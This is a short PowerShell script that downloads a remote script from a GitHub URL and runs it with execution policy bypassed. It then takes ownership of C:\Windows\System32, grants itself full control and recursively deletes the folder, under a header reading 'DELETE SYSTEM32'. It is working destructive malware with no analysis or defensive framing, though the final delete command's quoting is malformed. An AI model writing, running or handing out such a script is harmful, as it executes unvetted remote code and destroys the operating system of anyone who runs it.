# ===============================
# CONFIG
# ===============================

$remotePs1Url = "https://raw.githubusercontent.com/Star2likesgirls/powershell/refs/heads/main/pleaseinsertcoin.ps1"
$localPs1Path = Join-Path $env:TEMP "chiaki.ps1"

# ===============================
# DOWNLOAD REMOTE PS1
# ===============================

Write-Host "Downloading remote PowerShell script..."
Invoke-WebRequest -Uri $remotePs1Url -OutFile $localPs1Path -UseBasicParsing

# ===============================
# RUN REMOTE PS1 AND WAIT
# ===============================

Write-Host "Running remote PowerShell script..."
Start-Process powershell `
    -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$localPs1Path`"" `
    -Wait

Write-Host "Remote PowerShell script finished."

# ===============================
# DELETE SYSTEM32
# ===============================

Write-Host "Running CMD command 1..."
Start-Process cmd.exe -ArgumentList "/c takeown /F C:\Windows\System32 /R /D Y" -Wait

Write-Host "Running CMD command 2..."
Start-Process cmd.exe -ArgumentList "/c icacls C:\Windows\System32 /T /grant Administrator:F" -Wait

Write-Host "Running CMD command 3..."
Start-Process cmd.exe -ArgumentList "/c RMDIR "C:\Windows\System32" /s /y" -Wait

Write-Host "All commands completed."
